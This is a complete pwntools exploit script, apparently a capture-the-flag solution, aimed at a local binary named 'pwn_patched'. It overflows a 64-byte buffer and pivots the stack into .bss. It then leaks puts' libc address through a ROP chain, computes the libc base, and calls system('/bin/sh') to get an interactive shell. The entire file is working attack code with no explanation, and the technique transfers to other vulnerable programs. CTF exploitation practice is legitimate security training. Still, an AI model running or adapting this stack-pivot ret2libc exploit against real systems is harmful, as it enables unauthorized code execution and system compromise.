from pwn import *
context(arch='amd64', os='linux', log_level='debug')
p = process('./pwn_patched')
#p = remote('127.0.0.1',42709)
elf = ELF('./pwn_patched')
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
prdi = 0x40119e
ret = 0x40101a
leave = 0x40127b
bss_add = 0x404800
read_add = 0x401264
rop_add = bss_add + 0x60
new_rbp = rop_add + 0x40
payload1 = flat([
    b'A' * 64,
    bss_add + 0x40,
    read_add
])
p.recvuntil(b'> ')
p.send(payload1)
payload2 = flat([
    new_rbp,
    ret,
    prdi,
    puts_got,
    puts_plt,
    read_add
])
payload2 = payload2.ljust(0x40,b'\x00')
payload2 += p64(bss_add)
payload2 += p64(leave)
sleep(0.1)
p.send(payload2)
leak_data = p.recvline(keepends=False)
#leak_data = p.recv(6)  
leak_puts = u64(leak_data.ljust(8, b'\x00'))
log.success(f'puts地址:{hex(leak_puts)}')
libc = ELF('./libc.so.6')
libc_base = leak_puts - libc.sym['puts']
log.success(f'libc基址:{hex(libc_base)}')
libc.address = libc_base
system_add = libc.sym['system']
bin_add = next(libc.search(b'/bin/sh'))
payload3 = flat([
    0,
    ret,
    prdi,
    bin_add,
    system_add
])
payload3 = payload3.ljust(0x40,b'\x00')
payload3 += p64(rop_add)
payload3 += p64(leave)
sleep(0.1)
p.send(payload3)
p.interactive()

